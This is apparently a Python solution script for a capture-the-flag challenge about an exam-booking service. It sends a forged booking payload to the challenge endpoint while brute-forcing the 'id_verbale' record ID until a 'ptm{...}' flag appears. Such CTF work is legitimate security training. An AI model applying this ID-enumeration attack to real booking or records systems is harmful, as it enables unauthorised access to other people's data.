import requests
import re

URL = "http://exambooking.challs.olicyber.it/bakand"
payload = {'id_verbale': 0, 'cod_ins': '01ELEET', 'd_ini_appel': '', 'd_fin_appel': '', 'data_appello': '2021-07-05',
        'frequenza': 2021, 'nome_insegnamento': 'Hacktivism', 'docente': 'ROBOT MR',
        'data_ora_appello': '05-07-2021 17:00', 'desc_tipo': 'Esami scritti a risposta aperta o chiusa tramite PC',
        'note': 'Please be advised that to take the test you need your credential for the PORTALE DELLA DIDATTICA. In '
                'the REMOTE EXAMS part you will find the link to the test. At the begging of the test, '
                'following respondus instructions, you must show a valid photo ID to the webcam in such a way that it '
                'can be read.',
        'mat_docente': '30120', 'aula': ' ', 'posti_liberi': 999}

for i in range(736):
    payload['id_verbale'] = i
    r = requests.post(URL, json=payload)
    if 'ptm{' in r.text:
        print(re.search("ptm{.*}", r.text).group(0))
        break